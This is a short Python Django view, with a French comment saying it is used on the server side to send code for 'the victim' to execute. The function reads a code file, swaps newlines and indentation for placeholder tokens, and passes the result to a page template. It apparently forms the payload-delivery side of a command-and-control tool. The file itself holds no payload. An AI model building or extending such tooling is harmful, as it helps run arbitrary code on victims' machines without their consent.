# sert du coté du serveur django pour envoyer le code à exécuter à la victime
def GetNewCode(request):
    with open("Battle/code.txt", "r") as f:
        read_a = f.read()
        read_a = read_a.replace("\n", "‰endline%")
        read_a = read_a.replace("    ", "%tab%")
        print(read_a)
        return render(request, "Battle/alliwant.html", {"data": read_a})

